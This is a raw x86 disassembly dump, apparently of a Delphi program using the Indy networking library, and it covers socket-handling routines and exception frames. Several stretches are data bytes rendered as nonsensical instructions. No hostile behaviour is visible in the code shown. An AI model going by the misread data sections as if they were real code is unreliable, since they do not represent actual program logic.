add [ eax + eax ] cl
add [ eax ] al
shl [ edi + 0x46 ] 0x1
push ebx
imul edi [ edx + 0x65 ] 0x426f6f54
imul esp [ edi - 0x73 ] 0x68e40040
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
inc esp
imul eax [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
imul eax [ esi ] 0xc
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_463b10
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_467088
sub_466775
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x68
outsd
jb r-xdata
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc al 0x45
dec ecx
push eax
popad
popad
outsb
insb
inc ebp
jb r-xdata
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x65 ] bp
je r-xdata
dec ebp
popad
js r-xdata
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x43644945 ] dl
insb
insb
inc edx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
push 0xc0046
add [ eax ] al
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] dl
inc ebp
outsd
jb r-xdata
mov esp 0x80004666
pop ebx
inc ecx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004669 ] ch
add [ eax ] al
add al dl
inc esi
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
arpl [ ebx + 0x61 ] bp
inc eax
add [ eax + 0x4668 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004668 ] al
add [ eax ] al
add al dl
inc esi
outsb
je r-xdata
add [ 0x65696c43 ] cl
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x61506449 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax + 0x46 ] 0x0
or al 0x0
add [ eax ] al
shl [ edi + 0x46 ] 0x1
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x18
inc esi
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
sbb al 0x68
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
inc ebx
push es
add [ eax ] al
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
adc [ edx + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push 0x46
add [ eax + eax ] cl
add [ eax ] al
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add al cl
xor eax [ eax ]
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
imul ebp [ esi + 0x64 ] 0x74726f50
outsd
jne r-xdata
inc ebx
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
dec ecx
dec esi
outsd
je r-xdata
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
shr [ eax + 0x4669 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x69
inc esi
add [ eax + eax ] cl
add [ eax ] al
shl [ edi + 0x46 ] 0x1
push ebx
imul edi [ edx + 0x65 ] 0x426f6f54
imul esp [ edi - 0x73 ] 0x68e40040
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
inc esp
imul eax [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
imul eax [ esi ] 0xc
shl [ edi + 0x46 ] 0x1
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] bl
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ eax ] al
[ eax ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_463b10
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_467088
sub_466a24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_463b10
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_467088
sub_466a60
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_466a94
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_467040
mov eax ebx
call sub_467064
sub_466acc
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418838
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_466afc
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_466b20
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_466b44
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463abc
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_466b84
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_466c43
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
push edx
push ecx
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x58 ]
cmp eax 0xffffffff
jne r-xdata
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
cmp eax 0x2738
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c4a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ rw-data ]
mov eax [ eax ]
or edx 0xffffffff
call sub_463abc
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub_466c54
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_466c80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_466d94
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_4670b8
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d9b
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f64
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_46710c
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
jmp r-xdata
sub_466da0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_403f94
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_466dbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463abc
pop esi
pop ebx
retn
sub_466de4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_467088
lea eax [ edi + 0x1c ]
push eax
lea ecx [ edi + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov esi eax
push 0x1
mov [ esp + 0x4 ] 0x2714
mov [ esp + 0x8 ] 0x2736
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_463ac8
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ edi + 0xc ] esi
mov [ edi + 0x10 ] 0x1
mov eax edi
call sub_467040
mov eax edi
call sub_467064
sub_466e58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_418800
mov dl 0x1
mov eax edi
call sub_467088
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_466eb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466fe1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_465f0c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466fc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417d38
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_465ec8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_466eb0
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_466eb0
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466fe8
lea eax [ ebp - 0xc ]
call sub_403f40
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_466ff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4030b4
mov edi eax
mov eax esi
call sub_4030b4
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_403f94
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_403f94
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_4184a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_467040
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_467064
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_467088
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_403f40
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_403f40
xor eax eax
mov [ ebx + 0x1c ] eax
sub_4670b8
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463ac8
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_467040
sub_46710c
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_4670b8
test al al
je r-xdata
sub_46713c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx ecx
mov esi edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4671b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417d38
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_465ec8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4671b8
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_4671e4
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
xor ebp ebp
mov eax esi
call sub_418bec
mov ebx eax
dec ebx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
mov edx ebx
mov eax esi
call sub_467260
cmp edi [ eax + 0xc ]
jne r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_467260
mov ebp eax
dec ebx
sub_467224
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_418edc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_467274
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467299
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4672a0
retn
sub_4674a6
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
outsb
push ebx
outsb
adc [ fs : ebp + 0x46 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] cl
inc esi
add [ eax ] dh
add [ eax ] al
add [ ebx + ebx * 2 - 0x11b7ffba ] al
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi ] ah
inc ecx
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax + 0x28004184 ] ch
jmp r-xdata
pop es
adc dl [ ecx + ecx * 2 + 0x64 ]
push ebx
jb r-xdata
fimul [ ebx - 0x742dcc10 ]
jb r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
outsb
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
je r-xdata
jb r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov [ esi + 0x38 ] 0x1
add esp 0xfffffff0
call sub_403490
jo r-xdata
mov eax esi
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
jo r-xdata
adc [ ebp + 0x46 ] dh
add [ esp + ebx * 2 ] dl
inc esi
add [ edx ] al
add [ ebx ] cl
dec ecx
dec ecx
outsb
je r-xdata
mov eax esi
test bl bl
je r-xdata
inc esi
inc esi
cmp [ ecx ] al
jb r-xdata
jo r-xdata
pop esi
pop ebx
retn
add [ eax ] al
add [ ebx - 0x3974f33c ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4a ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4675ac
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4675d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov [ esi + 0x38 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46760c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_41a3e0
sub_46763c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_41a3e0
sub_46766c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_4676e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_467705
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46770c
retn
sub_46771b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
ja r-xdata
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
ja r-xdata
insb
sub [ eax ] eax
insb
sub [ eax ] eax
insb
sub [ eax ] eax
or al 0x54
out dx al
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x60004662 ] al
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add [ eax + edi * 2 ] dh
inc esi
add ah bh
ja r-xdata
add [ eax ] ch
add [ eax ] al
cwde
popad
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax ] cl
js r-xdata
add [ eax ] ah
xor [ eax ] eax
or [ eax + 0x46 ] bh
inc eax
add ah dl
ja r-xdata
dec ecx
dec ecx
add [ eax ] al
js r-xdata
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax + 0x28004184 ] ch
inc eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466318
test bl bl
jle r-xdata
